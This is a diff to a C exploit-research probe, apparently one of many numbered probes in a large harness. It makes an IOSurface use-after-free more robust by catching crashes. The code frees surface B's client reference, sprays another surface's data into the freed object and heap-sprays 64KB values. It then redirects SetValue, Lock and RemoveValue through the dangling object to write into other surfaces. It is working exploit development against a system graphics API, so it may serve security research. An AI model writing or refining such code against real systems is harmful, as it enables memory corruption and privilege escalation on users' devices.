@@ -16206,16 +16206,33 @@ static void r394_probe(void) {
     clientRelease(surfB);
     rlog("  Freed B's client ref\n\n");
 
+    /* Set up signal handler for crash protection */
+    struct sigaction sa394, old_bus394, old_segv394;
+    memset(&sa394, 0, sizeof(sa394));
+    sa394.sa_handler = r394_sighandler;
+    sa394.sa_flags = 0;
+    sigaction(SIGBUS, &sa394, &old_bus394);
+    sigaction(SIGSEGV, &sa394, &old_segv394);
+
     /* Phase 1: SetValue B→A, then B→C, verify writes land on correct targets */
     rlog("  Phase 1: Cross-surface SetValue with target switching\n");
 
     /* Redirect B→A */
     memcpy((void*)freedB, dataA, 448);
-    int v1 = 0x11111111;
-    CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
-    IOSurfaceSetValue(surfB, CFSTR("XW_Phase1_A"), n1);
-    CFRelease(n1);
-    rlog("    SetValue 'XW_Phase1_A'=0x11111111 through B→A\n");
+    rlog("    Sprayed A's data, calling SetValue...\n");
+    fflush(stdout);
+
+    g_r394_crashed = 0;
+    if (sigsetjmp(g_r394_jmp, 1) == 0) {
+        int v1 = 0x11111111;
+        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
+        IOSurfaceSetValue(surfB, CFSTR("XW_Phase1_A"), n1);
+        CFRelease(n1);
+        rlog("    SetValue 'XW_Phase1_A'=0x11111111 through B→A: OK\n");
+    } else {
+        rlog("    SetValue B→A CRASHED: signal %d\n", g_r394_crashed);
+    }
+    fflush(stdout);
 
     /* Verify on A directly */
     CFTypeRef rv = IOSurfaceCopyValue(surfA, CFSTR("XW_Phase1_A"));
@@ -16230,11 +16247,20 @@ static void r394_probe(void) {
 
     /* Redirect B→C */
     memcpy((void*)freedB, dataC, 448);
-    int v2 = 0x22222222;
-    CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &v2);
-    IOSurfaceSetValue(surfB, CFSTR("XW_Phase1_C"), n2);
-    CFRelease(n2);
-    rlog("    SetValue 'XW_Phase1_C'=0x22222222 through B→C\n");
+    rlog("    Sprayed C's data, calling SetValue...\n");
+    fflush(stdout);
+
+    g_r394_crashed = 0;
+    if (sigsetjmp(g_r394_jmp, 1) == 0) {
+        int v2 = 0x22222222;
+        CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &v2);
+        IOSurfaceSetValue(surfB, CFSTR("XW_Phase1_C"), n2);
+        CFRelease(n2);
+        rlog("    SetValue 'XW_Phase1_C'=0x22222222 through B→C: OK\n");
+    } else {
+        rlog("    SetValue B→C CRASHED: signal %d\n", g_r394_crashed);
+    }
+    fflush(stdout);
 
     /* Verify on C directly */
     rv = IOSurfaceCopyValue(surfC, CFSTR("XW_Phase1_C"));
@@ -16269,13 +16295,6 @@ static void r394_probe(void) {
     rlog("    Wrote 0xCC pattern to C's backing store\n");
 
     /* Now lock through B→C redirect */
-    struct sigaction sa394, old_bus394, old_segv394;
-    memset(&sa394, 0, sizeof(sa394));
-    sa394.sa_handler = r394_sighandler;
-    sa394.sa_flags = 0;
-    sigaction(SIGBUS, &sa394, &old_bus394);
-    sigaction(SIGSEGV, &sa394, &old_segv394);
-
     g_r394_crashed = 0;
     if (sigsetjmp(g_r394_jmp, 1) == 0) {
         IOSurfaceLock(surfB, 0, NULL);
@@ -16347,10 +16366,17 @@ static void r394_probe(void) {
     uint8_t *bigdata = (uint8_t*)malloc(65536);
     for (int i = 0; i < 65536; i++) bigdata[i] = (uint8_t)(i & 0xFF);
     CFDataRef cfbig = CFDataCreate(NULL, bigdata, 65536);
-    IOSurfaceSetValue(surfB, CFSTR("BigSpray394"), cfbig);
+
+    g_r394_crashed = 0;
+    if (sigsetjmp(g_r394_jmp, 1) == 0) {
+        IOSurfaceSetValue(surfB, CFSTR("BigSpray394"), cfbig);
+        rlog("    Set 64KB 'BigSpray394' through B→C: OK\n");
+    } else {
+        rlog("    64KB SetValue CRASHED: signal %d\n", g_r394_crashed);
+    }
     CFRelease(cfbig);
     free(bigdata);
-    rlog("    Set 64KB 'BigSpray394' through B→C\n");
+    fflush(stdout);
 
     /* Verify on C */
     rv = IOSurfaceCopyValue(surfC, CFSTR("BigSpray394"));
@@ -16384,8 +16410,14 @@ static void r394_probe(void) {
 
     /* Redirect B→A and RemoveValue */
     memcpy((void*)freedB, dataA, 448);
-    IOSurfaceRemoveValue(surfB, CFSTR("ToRemove394"));
-    rlog("    RemoveValue 'ToRemove394' through B→A\n");
+    g_r394_crashed = 0;
+    if (sigsetjmp(g_r394_jmp, 1) == 0) {
+        IOSurfaceRemoveValue(surfB, CFSTR("ToRemove394"));
+        rlog("    RemoveValue 'ToRemove394' through B→A: OK\n");
+    } else {
+        rlog("    RemoveValue CRASHED: signal %d\n", g_r394_crashed);
+    }
+    fflush(stdout);
 
     rv = IOSurfaceCopyValue(surfA, CFSTR("ToRemove394"));
     rlog("    A has ToRemove394 after: %s\n", rv ? "YES (still there)" : "NO (removed!)");
